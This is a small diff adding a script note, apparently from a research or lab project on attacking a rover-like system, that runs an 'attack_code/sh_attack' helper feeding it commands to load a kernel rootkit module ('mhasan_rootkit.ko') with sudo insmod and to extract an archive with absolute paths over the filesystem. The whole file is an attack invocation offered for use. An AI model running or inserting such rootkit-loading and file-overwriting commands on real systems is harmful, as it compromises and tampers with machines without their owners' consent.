@@ -1,0 +1,5 @@
+# for attack code:
+# run from id_time binary folder
+
+
+attack_code/./sh_attack <<< $'sudo insmod attack_code/mhasan_rootkit.ko\ntar xfP ../roverlog/imagelog.tar\nexit\n'
